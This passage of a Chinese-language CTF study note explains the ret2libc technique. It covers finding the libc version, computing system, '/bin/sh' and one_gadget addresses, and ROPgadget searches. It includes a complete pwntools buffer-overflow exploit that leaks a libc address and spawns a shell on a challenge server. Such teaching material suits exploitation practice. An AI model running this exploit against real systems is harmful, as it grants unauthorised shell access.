id="f4d98e95-0e0f-48a3-89d0-4113ff8f02a0" class="">也就是说一个libc进行多次加载，它的某函数在这多次加载中地址会变，但地址的低3位不会变</p><p id="460e6b1b-389d-47a5-a4a9-8753f057b1a6" class="">然后有一些网站或工具，则是可以根据函数的第三位地址，匹配到其对应的libc并显示该libc的基址</p><p id="ad071bb5-8b54-4bee-88f5-e0bb54472337" class="">【操作】</p><p id="75cd094e-bac1-422f-8454-52204d326648" class="">这两个网站：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4c03accf-a518-494b-83a0-e2c5519cb6e1" class="code"><code class="language-Python">https://libc.rip/
+https://libc.blukat.me/</code></pre><p id="b7477269-d509-4e0f-911f-9dd453c08679" class="">使用示例：</p><figure id="2b8cf8ea-2237-485e-bdec-e36face758cb" class="image"><a href="%E3%80%90PWN%E6%8A%80%E3%80%91ret2libc%20e4ce3fc12daf428a8819733ea0132b35/Untitled.png"><img style="width:528px" src="%E3%80%90PWN%E6%8A%80%E3%80%91ret2libc%20e4ce3fc12daf428a8819733ea0132b35/Untitled.png"/></a></figure><blockquote id="ff3f7663-2d07-408a-968c-67f62a7dde95" class="">注意：<p id="e95dc1de-7d3f-4daf-b08c-7071f0883a24" class="">1、会有多个结果，所以要多输几个符号</p><p id="f550a6e4-daca-492c-a95e-94c47cd5e9d6" class="">2、建议俩网站一起用</p></blockquote><p id="01870ad7-a7f4-4795-8829-0997b6117397" class="">或者你可以用这个工具：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="37dcf34e-656c-44fd-b0d7-525f6fd85b17" class="code"><code class="language-Shell">from LibcSearcher import *
+
+libc=LibcSearcher(&#x27;printf&#x27;, printf_addr)       
+libc_base=printf_addr - libc.dump(&#x27;printf&#x27;)
+system_addr=libc_base + libc.dump(&#x27;system&#x27;)
+# binsh=libc_base + libc.dump(&quot;str_bin_sh&quot;)</code></pre></details></li></ul><ul id="be1460e4-482e-4d75-8766-b2a9c539b88e" class="toggle"><li><details open=""><summary>思路2-从可执行文件信息中查看libc版本（不一定有用！也不好用，思路1没用的时候再用）</summary><p id="4bbe0e87-2f9b-4a98-86ee-8adf33bfdbbc" class="">【操作】</p><p id="9da9a177-8ca3-4c01-aa4c-cfbf999a38ab" class="">（1）使用strings查看可执行文件的linux版本和libc<strong>小版本（注意：在libc2.23里面这个小版本不准）</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8815160-c836-4620-b68d-c1ade3435156" class="code"><code class="language-Shell">$ strings -tx pwn | grep &quot;GCC&quot;
+9028 GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0</code></pre><p id="602543a7-ea29-4f9b-8197-f8b908bfce8e" class="">↑如上，linux版本是ubantu20.04，小版本是9.4</p><p id="64147a42-2be6-461c-8d77-0dd2d1503f51" class="">(2）然后按照这个对照关系得到对应的libc<strong>大版本</strong>：</p><table id="400aac7b-ade4-4a4d-8194-6066b9c788ea" class="simple-table"><tbody><tr id="5c0b0163-c936-4484-9210-a4b3df4fd6e5"><td id="=JRf" class="">ubantu20.04</td><td id="==?m" class="" style="width:219.9166717529297px">libc6_2.31</td></tr><tr id="78a0a82e-69d3-47c3-bd51-e7aa8f0a86af"><td id="=JRf" class="">Kali2022</td><td id="==?m" class="" style="width:219.9166717529297px">Debian GLIBC 2.36-8</td></tr><tr id="8709f397-dc2f-466c-853d-41bd3a5366d6"><td id="=JRf" class="">Ubuntu16.04</td><td id="==?m" class="" style="width:219.9166717529297px">libc6_2.23</td></tr><tr id="cc73b006-e727-45ca-9846-36519f53ea01"><td id="=JRf" class="">ubantu18.04</td><td id="==?m" class="" style="width:219.9166717529297px">libc6-2.27</td></tr></tbody></table><p id="bb228f62-a7da-4a07-9b4a-e3aa42fe7dbd" class="">（3）然后根据得到的libc版本去下载对应的libc文件</p></details></li></ul><blockquote id="13558999-4f30-4700-a1d2-0ac7a98872a8" class="">注意：有些题目程序里面没有写明要用到的glibc版本，也就导致它在哪里执行，就会自动使用执行环境的glibc版本。<mark class="highlight-red">所以我们不能去泄漏本地的glibc，必须要去泄漏remote的glibc为准！</mark></blockquote></li></ul><h3 id="80a7405b-b94a-49f8-b717-286e32571620" class="">3-偏移计算</h3><ul id="be8f58bf-5fde-4da9-888b-56d94ae99622" class="toggle"><li><details open=""><summary>这里以”泄漏了__libc_start_main地址，要求system和’binsh’”为例</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="849ecb1a-0ddf-459b-b963-13659b81e141" class="code"><code class="language-Python">libc_base = libc_start_main_addr-libc.symbols[&#x27;__libc_start_main&#x27;] # 获取libc基地址
+system_addr = libc.symbols[&#x27;system&#x27;] + libc_base # 获取system函数地址
+binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;)) + libc_base # 获取/bin/sh字符串地址
+
+# 过程输出
+print(&quot;__libc_start_main_symbol_addr: &quot;,libc.symbols[&#x27;__libc_start_main&#x27;])
+print(&quot;system_addr: &quot;,hex(system_addr))
+print(&quot;binsh_addr: &quot;,hex(binsh_addr))</code></pre></details></li></ul><ul id="6e8b1122-ae43-4f89-88cf-414d1cb2ae0d" class="toggle"><li><details open=""><summary>这里以”泄漏了__libc_start_main地址，要求onegadget”为例（需要题目有给libc文件）</summary><p id="02cda408-de87-41ed-998d-6289f72e14d5" class="">搜素onegadgets：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="88b99389-6f4b-4a75-af93-ea946091fb2b" class="code"><code class="language-Python">one_gadget /lib/x86_64-linux-gnu/libc.so.6 </code></pre><p id="46a206d8-5c13-4683-9962-4e0bb82c23ec" class="">可以得到其偏移</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4d26002-f371-49d7-959e-136faf383752" class="code"><code class="language-Python">onegadget_offset=...
+libc_base = libc_start_main_addr-libc.symbols[&#x27;__libc_start_main&#x27;] # 获取libc基地址
+onegadget_addr= onegadget_offset + libc_base # 获取onegadget地址
+
+# 过程输出
+print(&quot;__libc_start_main_symbol_addr: &quot;,libc.symbols[&#x27;__libc_start_main&#x27;])
+print(&quot;onegadget_addr: &quot;,hex(onegadget_addr))</code></pre></details></li></ul><h1 id="110f60e3-29b3-47a4-97f6-c25b1518beb6" class="">三、综合示例</h1><ul id="780fdbf1-b377-44f0-8bda-33e453da846f" class="toggle"><li><details open=""><summary>x32下的一次ret2libc进行system(”/bin/sh”)，构建的是“执行puts函数→pop1ret→start函数”的rop链。</summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dffd0e64-01c0-43cd-8882-56696e5886b2" class="code"><code class="language-Python">from pwn import *
+#from LibcSearcher import LibcSearcher
+#p = process(&#x27;./ret2libc&#x27;)
+p=remote(&quot;10.144.0.228&quot;, 32778)
+context.log_level = &#x27;debug&#x27;
+start_addr = 0x080484d0#_start
+puts_plt_addr = 0x08048460
+libc_start_main_got_addr = 0x0804a020
+p.recvuntil(&#x27;Can you find it !?&#x27;)
+pause()#1
+#p.sendline(b&#x27;q&#x27;*108 + p32(0xffffcf38) +p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))
+p.sendline(b&#x27;q&#x27;*112 +p32(puts_plt_addr) + p32(start_addr) + p32(libc_start_main_got_addr))
+pause()#2
+libc_start_main_addr = u32(p.recv(4))
+print(&quot;__libc_start_main_addr: &quot;,hex(libc_start_main_addr))
+libc = ELF(&quot;./libc.so.6&quot;)	
+libc_base = libc_start_main_addr-libc.symbols[&#x27;__libc_start_main&#x27;] # 获取libc基地址
+system_addr = libc.symbols[&#x27;system&#x27;] + libc_base # 获取system函数地址
+binsh_addr = next(libc.search(b&#x27;/bin/sh&#x27;)) + libc_base # 获取/bin/sh字符串地址
+print(&quot;__libc_start_main_symbol_addr: &quot;,libc.symbols[&#x27;__libc_start_main&#x27;])
+print(&quot;system_addr: &quot;,hex(system_addr))
+print(&quot;binsh_addr: &quot;,hex(binsh_addr))
+p.recvuntil(&#x27;Can you find it !?&#x27;)
+p.sendline(b&#x27;s&#x27;*112 + p32(system_addr) + b&#x27;aaaa&#x27; + p32(binsh_addr))
+p.interactive()</code></pre></details></li></ul><ul id="13033547-df33-4517-b8ba-e339095ec75a" class="toggle"><li><details open=""><summary>获取libc中的gadgets</summary><p id="0c03e2f2-5c6c-4da9-ac6b-3d1a754663a0" class="">【定义】</p><p id="228048a7-3923-4816-87f0-0d07485e4da7" class="">如果可执行文件中的gadgets太少，就可以用这样的方式来获得gadgets</p><p id="dc2e82dd-2e04-4a6f-9b50-85ebf7578883" class="">【操作】</p><p id="daec6090-f357-45b2-9230-778ee364f38e" class="">首先还是先用ret2libc来获得libc的基址</p><p id="819f6d66-9023-49ed-aa51-d06467d277b1" class="">然后用ROPgadget去搜索libc文件中的gadgets偏移，然后<code>基址+偏移</code>得到了，libc中gadgets的绝对地址</p><ul id="083f3818-fbc4-4430-a07d-3f06d4d59847" class="toggle"><li><details open=""><summary>【示例】</summary><p id="9aa6fb67-6a5f-4f27-8573-fa5e52cca192" class="">有一个程序，它的gadgets如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a29bac58-ff33-4c8a-ad42-83c3d8d599a3" class="code"><code class="language-Python">$ ROPgadget --binary ./biexiangtao --only &quot;pop|ret&quot;
+Gadgets information
+============================================================
+0x00000000004013bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004013be : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004013c0 : pop r14 ; pop r15 ; ret
+0x00000000004013c2 : pop r15 ; ret
+0x00000000004013bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004013bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004011dd : pop rbp ; ret
+0x00000000004013c3 : pop rdi ; ret
+0x00000000004013c1 : pop rsi ; pop r15 ; ret
+0x00000000004013bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040101a : ret
+0x000000000040124b : ret 0x2be
+
+Unique gadgets found: 12</code></pre><p id="85362186-8e0c-4d58-9b19-e60f02ab9361" class="">它缺少pop_rdx_ret，我们可以在libc中去找，泄露printf绝对地址以得到基址，如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e82c59af-97cf-4188-92fb-fe92d2aa673e" class="code"><code class="language-Python">payload = b&#x27;a&#x27;*72
+payload += p64(pop_rdi_ret) + p64(elf.got[&quot;printf&quot;]) + p64(elf.sym[&quot;puts&quot;])
+payload += p64(elf.sym[&quot;main&quot;])
+
+io.sendafter(b&quot;&gt;&gt; &quot;, payload)
+
+lb = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)) - libc.sym[&quot;printf&quot;]
+log.success(&quot;lb ==&gt; &quot; + hex(lb))
+
+pop_rsi_ret = lb + 0x000000000002601f
+pop_rdx_ret = lb + 0x0000000000142c92</code></pre></details></li></ul></details></li></ul><p id="6c9ae7aa-e804-4f57-850b-811a944be72e" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
